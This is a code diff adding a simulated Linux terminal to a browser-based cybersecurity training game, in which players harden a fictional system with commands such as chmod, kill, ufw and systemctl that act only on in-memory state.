+                };
+                if (!targets.length) return { err: ['usage: grep [-i] [-r] PATTERN FILE'] };
+                for (const t of targets) {
+                    const n = this.nodeAt(t);
+                    if (!n) { out.push({ text: '', html: '<span class="err">grep: ' + esc(t) + ': No such file or directory</span>' }); continue; }
+                    scan(this.resolve(t), n, r && n.type === 'dir');
+                }
+                return { out };
+            },
+
+            find(args) {
+                const start = args[0] && !args[0].startsWith('-') ? args[0] : '.';
+                const nameIdx = args.indexOf('-name');
+                const permIdx = args.indexOf('-perm');
+                const typeIdx = args.indexOf('-type');
+                const name = nameIdx >= 0 ? args[nameIdx + 1] : null;
+                const perm = permIdx >= 0 ? args[permIdx + 1] : null;
+                const type = typeIdx >= 0 ? args[typeIdx + 1] : null;
+                const root = this.nodeAt(start);
+                if (!root) return { err: ['find: \'' + start + '\': No such file or directory'] };
+                const out = [];
+                const nameRe = name ? new RegExp('^' + name.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*') + '$') : null;
+                const walk = (abs, node) => {
+                    const base = abs.split('/').pop() || '/';
+                    let ok = true;
+                    if (type === 'f' && node.type !== 'file') ok = false;
+                    if (type === 'd' && node.type !== 'dir') ok = false;
+                    if (nameRe && !nameRe.test(base)) ok = false;
+                    if (perm && !permMatch(node.mode, perm)) ok = false;
+                    if (ok) out.push(abs || '/');
+                    if (node.type === 'dir') Object.keys(node.children).forEach((k) => walk((abs === '/' ? '' : abs) + '/' + k, node.children[k]));
+                };
+                walk(this.resolve(start) === '/' ? '' : this.resolve(start), root);
+                return { out: out.length ? out.map((p) => p || '/') : [] };
+            },
+
+            ps() {
+                const out = ['USER       PID  %CPU %MEM COMMAND'];
+                this.T.procs.forEach((p) => {
+                    const cpu = parseFloat(p.cpu);
+                    const line = p.user.padEnd(9) + ' ' + String(p.pid).padStart(5) + ' ' + p.cpu.padStart(5) + ' ' + p.mem.padStart(4) + ' ' + p.cmd;
+                    out.push({ text: line, html: cpu > 50 ? '<span class="hl">' + esc(line) + '</span>' : esc(line) });
+                });
+                return { out };
+            },
+
+            kill(pos) {
+                const pid = parseInt(pos.find((x) => /^\d+$/.test(x)), 10);
+                if (!pid) return { err: ['kill: usage: kill [-9] <pid>'] };
+                const idx = this.T.procs.findIndex((p) => p.pid === pid);
+                if (idx < 0) return { err: ['kill: (' + pid + '): No such process'] };
+                const proc = this.T.procs[idx];
+                this.T.procs.splice(idx, 1);
+                this.T.killedPids.add(pid);
+                this.T.killedCmds.add(proc.cmd.split('/').pop().split(' ')[0]);
+                return { out: [{ html: '<span class="ok">[+] process ' + pid + ' (' + esc(proc.cmd) + ') terminated</span>' }] };
+            },
+
+            chmod(pos) {
+                const mode = pos[0]; const target = pos[1];
+                if (!mode || !target) return { err: ['chmod: missing operand'] };
+                const n = this.nodeAt(target);
+                if (!n) return { err: ['chmod: cannot access \'' + target + '\': No such file or directory'] };
+                const nm = applyChmod(n.mode, mode);
+                if (!nm) return { err: ['chmod: invalid mode: \'' + mode + '\''] };
+                n.mode = nm;
+                return { out: [{ html: '<span class="ok">[+] ' + esc(target) + ' is now ' + esc(nm) + '</span>' }] };
+            },
+
+            ss() {
+                const out = ['Netid State  Local Address:Port   Process'];
+                this.T.net.forEach((s) => {
+                    const warn = s.port === 23 || s.port === 3306 || s.port === 21;
+                    const line = s.proto.padEnd(5) + ' LISTEN ' + (s.addr + ':' + s.port).padEnd(20) + ' ' + s.proc;
+                    out.push({ text: line, html: warn ? '<span class="hl">' + esc(line) + '  ⚠ public</span>' : esc(line) });
+                });
+                return { out };
+            },
+
+            ufw(args) {
+                const sub = args[0];
+                const T = this.T;
+                if (sub === 'status' || !sub) {
+                    const rows = ['Status: ' + (T.ufw.enabled ? 'active' : 'inactive')];
+                    T.ufw.deny.forEach((p) => rows.push(p.padEnd(22) + 'DENY        Anywhere'));
+                    T.ufw.allow.forEach((p) => rows.push(p.padEnd(22) + 'ALLOW       Anywhere'));
+                    T.ufw.denyFrom.forEach((ip) => rows.push('Anywhere'.padEnd(22) + 'DENY        ' + ip));
+                    return { out: rows };
+                }
+                if (sub === 'enable') { T.ufw.enabled = true; return { out: [{ html: '<span class="ok">Firewall is active and enabled on system startup</span>' }] }; }
+                if (sub === 'deny' || sub === 'allow') {
+                    if (args[1] === 'from') { T.ufw.denyFrom.add(args[2]); return { out: [{ html: '<span class="ok">Rule added: ' + sub + ' from ' + esc(args[2] || '') + '</span>' }] }; }
+                    const port = (args[1] || '').replace(/\/tcp|\/udp/, '');
+                    if (!port) return { err: ['ERROR: wrong number of arguments'] };
+                    T.ufw[sub].add(port);
+                    return { out: [{ html: '<span class="ok">Rule added: ' + sub + ' ' + esc(port) + '</span>' }] };
+                }
+                return { err: ['ufw: unknown command (try: ufw status, ufw deny <port>, ufw deny from <ip>)'] };
+            },
+
+            systemctl(args) {
+                const sub = args[0]; const svc = (args[1] || '').replace('.service', '');
+                const T = this.T;
+                if (sub === 'status') {
+                    const st = T.stoppedSvc.has(svc) ? 'inactive (dead)' : (T.services[svc] ? 'active (running)' : 'could not be found');
+                    return { out: [svc + '.service — ' + svc, '   Active: ' + st] };
+                }
+                if (sub === 'stop') { if (!(svc in T.services)) return { err: ['Failed to stop ' + svc + '.service: Unit not found.'] }; T.stoppedSvc.add(svc); return { out: [{ html: '<span class="ok">[+] stopped ' + esc(svc) + '</span>' }] }; }
+                if (sub === 'disable') { T.disabledSvc.add(svc); return { out: [{ html: '<span class="ok">[+] disabled ' + esc(svc) + ' (won\'t start at boot)</span>' }] }; }
+                if (sub === 'start') { T.stoppedSvc.delete(svc); return { out: ['[+] started ' + svc] }; }
+                return { err: ['systemctl: unknown command (try: systemctl status|stop|disable <service>)'] };
+            },
+
+            sha(pos) {
+                const n = this.nodeAt(pos[0] || '');
+                if (!n || n.type !== 'file') return { err: ['sha256sum: ' + (pos[0] || '') + ': No such file'] };
+                this.T.read.add(this.resolve(pos[0]));
+                let h = 0; for (let i = 0; i < n.content.length; i++) h = (h * 31 + n.content.charCodeAt(i)) >>> 0;
+                const hex = (h.toString(16) + '0'.repeat(8)).slice(0, 8).repeat(8).slice(0, 64);
+                return { out: [hex + '  ' + pos[0]] };
+            },
+
+            renderObjectives() {
+                $('ops-objectives').innerHTML = this.lab.tasks.map((t) => {
+                    const done = t.check(this.T);
+                    return '<li class="' + (done ? 'done' : '') + '"><span>' + esc(t.desc) + '</span></li>';
+                }).join('');
+                const done = this.lab.tasks.filter((t) => t.check(this.T)).length;
+                $('ops-count').textContent = done + '/' + this.lab.tasks.length;
+            },
+
+            checkTasks() {
+                const before = this.lab.tasks.filter((t) => t._was).length;
+                this.lab.tasks.forEach((t) => {
+                    const now = t.check(this.T);
+                    if (now && !t._was) { t._was = true; this.print('<span class="ok">✓ objective complete: ' + esc(t.desc) + '</span>'); }
+                });
+                this.renderObjectives();
+                if (this.lab.tasks.every((t) => t.check(this.T))) this.finish();
+            },
+
+            finish() {
+                if (this._finished) return;
+                this._finished = true;
+                const l = this.lab;
+                const prev = (progress.labs && progress.labs[l.id]) || { done: false, xp: 0 };
+                const first = !prev.done;
+                progress.labs = progress.labs || {};
+                progress.labs[l.id] = { done: true, xp: l.xp };
+                saveProgress();
+                $('ops-done-title').textContent = '🎉 ' + l.title + ' complete!';
+                $('ops-done-text').innerHTML = esc(l.debrief) + (first ? ' <b>+' + l.xp + ' XP</b>' : ' <span class="dim">(already cleared)</span>');
+                $('ops-done').className = 'term-done show';
+                $('ops-done').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            }
+        };
+
+        function num(a, def) { const i = a.indexOf('-n'); return i >= 0 ? parseInt(a[i + 1], 10) || def : def; }
+        function hlMatch(line, pat, ci) {
+            if (!pat) return esc(line);
+            try {
+                const re = new RegExp('(' + pat.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', ci ? 'gi' : 'g');
+                return esc(line).replace(new RegExp('(' + esc(pat).replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', ci ? 'gi' : 'g'), '<span class="hl">$1</span>');
+            } catch (e) { return esc(line); }
+        }
+        function lsLine(n, name) {
+            const size = n.type === 'dir' ? '4096' : String((n.content || '').length);
+            return { text: n.mode + ' ' + (n.owner || 'alex').padEnd(8) + ' ' + size.padStart(5) + ' ' + name, html: (n.type === 'dir' ? '<span class="ok">' : '') + esc(n.mode + ' ' + (n.owner || 'alex').padEnd(8) + ' ' + size.padStart(5) + ' ' + name) + (n.type === 'dir' ? '</span>' : '') };
+        }
+        // World bits: positions 7,8,9 in a mode string like -rw-rw-rw-.
+        function permMatch(mode, spec) {
+            if (spec === '-0002' || spec === '/0002' || spec === '-o+w') return mode[8] === 'w';
+            if (spec === '-0004' || spec === '/0004' || spec === '-o+r') return mode[7] === 'r';
+            if (spec === '-0006' || spec === '/0006') return mode[7] === 'r' || mode[8] === 'w';
+            return false;
+        }
+        function applyChmod(mode, spec) {
+            const arr = mode.split('');
+            if (/^[0-7]{3,4}$/.test(spec)) {
+                const digits = spec.slice(-3).split('').map(Number);
+                const map = ['---', '--x', '-w-', '-wx', 'r--', 'r-x', 'rw-', 'rwx'];
+                for (let g = 0; g < 3; g++) { const b = map[digits[g]]; arr[1 + g * 3] = b[0]; arr[2 + g * 3] = b[1]; arr[3 + g * 3] = b[2]; }
+                return arr.join('');
+            }
+            const m = spec.match(/^([ugoa]+)([+-])([rwx]+)$/);
+            if (!m) return null;
+            const who = m[1].includes('a') ? 'ugo' : m[1];
+            const add = m[2] === '+';
+            const off = { u: 0, g: 3, o: 6 };
+            const col = { r: 1, w: 2, x: 3 };
+            for (const w of who) for (const p of m[3]) { const idx = off[w] + col[p]; arr[idx] = add ? p : '-'; }
+            return arr.join('');
+        }
+        const HELP = [
+            '<span class="hl">Available commands</span> (this is a safe simulation):',
+            '  <span class="hl">ls</span> [-a -l] [dir]   list files        <span class="hl">cd</span> &lt;dir&gt;        change directory',
+            '  <span class="hl">pwd</span>                where am I         <span class="hl">cat</span> &lt;file&gt;      read a file',
+            '  <span class="hl">grep</span> [-i -r] PAT FILE  search in files   <span class="hl">find</span> PATH -perm -0002   find files',
+            '  <span class="hl">ps</span> aux             running processes  <span class="hl">kill</span> &lt;pid&gt;      stop a process',
+            '  <span class="hl">chmod</span> 640 &lt;file&gt;    change permissions <span class="hl">ss</span> -tlnp         listening ports',
+            '  <span class="hl">ufw</span> deny &lt;port&gt;     firewall rule      <span class="hl">systemctl</span> stop &lt;svc&gt;  stop a service',
+            '  <span class="hl">whoami</span> / <span class="hl">id</span>        who am I          <span class="hl">sha256sum</span> &lt;file&gt;  checksum a file',
+            '  <span class="hl">hint</span>  next step        <span class="hl">clear</span>  wipe screen   you can also pipe:  cat file | grep word'
+        ].join('\n');
+        const MAN = {
+            ls: 'ls — list directory contents. -a shows hidden (dotfiles), -l shows details.',
+            grep: 'grep — print lines matching a pattern. -i ignores case, -r searches a directory.',
+            chmod: 'chmod — change file permissions. e.g. chmod 640 file = owner read/write, group read, others nothing.',
+            kill: 'kill — send a signal to a process by PID. kill -9 forces it.',
+            ufw: 'ufw — uncomplicated firewall. ufw deny <port> blocks a port; ufw deny from <ip> blocks an address.',
+            ss: 'ss — show listening sockets. -t tcp, -l listening, -n numeric, -p process.',
+            find: 'find — search for files. -perm -0002 finds world-writable, -name matches a name, -type f files only.',
+            ps: 'ps — report running processes. "ps aux" shows every process with CPU and memory.',
+            systemctl: 'systemctl — control services. stop halts now, disable stops it starting at boot.'
+        };
+
         // ── Events ────────────────────────────────────────────────────────
         document.addEventListener('click', (e) => {
             const go = e.target.closest('[data-go]');
             if (go) return show(go.dataset.go);
+            const lab = e.target.closest('[data-lab]');
+            if (lab && !lab.disabled) return Ops.open(lab.dataset.lab);
+            const chip = e.target.closest('[data-chip]');
+            if (chip) { const inp = $('ops-input'); inp.value = chip.dataset.chip; inp.focus(); Ops.submit(chip.dataset.chip); return; }
             const mission = e.target.closest('[data-mission]');
             if (mission && !mission.disabled) return openBriefing(mission.dataset.mission);
             const opt = e.target.closest('[data-opt]');
@@ -2246,6 +2979,19 @@ permalink: /cyber-quest/
             if (e.target.id === 'next') return next();
         });
         $('b-start').addEventListener('click', startMission);
+        $('ob-start').addEventListener('click', () => Ops.start());
+        $('ops-continue').addEventListener('click', () => show('home'));
+        $('ops-quit').addEventListener('click', () => {
+            if (Ops._finished || window.confirm('Leave the terminal? Your objective progress in this lab is saved only when you finish it.')) {
+                Ops._finished = false;
+                show('home');
+            }
+        });
+        $('ops-input').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') { e.preventDefault(); if (!Ops._finished) Ops.submit(e.target.value); }
+            else if (e.key === 'ArrowUp') { e.preventDefault(); if (Ops.histPos > 0) { Ops.histPos--; e.target.value = Ops.hist[Ops.histPos] || ''; } }
+            else if (e.key === 'ArrowDown') { e.preventDefault(); if (Ops.histPos < Ops.hist.length) { Ops.histPos++; e.target.value = Ops.hist[Ops.histPos] || ''; } }
+        });
         $('quit').addEventListener('click', () => {
             if (window.confirm('Quit this mission? Progress in this run will be lost.')) {
                 stopTimer();
@@ -2254,7 +3000,7 @@ permalink: /cyber-quest/
         });
         $('reset').addEventListener('click', () => {
             if (window.confirm('Reset all progress, stars and XP?')) {
-                progress = { v: 1, missions: {} };
+                progress = { v: 1, missions: {}, labs: {} };
                 saveProgress();
                 show('home');
                 toast('Progress reset.');
@@ -2289,7 +3035,16 @@ permalink: /cyber-quest/
                     if (q.kind === 'order') q.items.forEach((_, k) => pickOrder(S.order.indexOf(q.items.length - 1 - k)));
                     else choose(S.order.findIndex((i) => i !== q.answer));
                 },
-                next
+                next,
+                labs: LABS.map((l) => l.id),
+                ops: {
+                    open: (id) => Ops.open(id),
+                    start: () => Ops.start(),
+                    run: (cmd) => Ops.submit(cmd),
+                    get done() { return Ops._finished; },
+                    get tasks() { return Ops.lab.tasks.map((t) => ({ desc: t.desc, done: t.check(Ops.T) })); },
+                    get out() { return $('ops-out').textContent; }
+                }
             };
         }
     })();
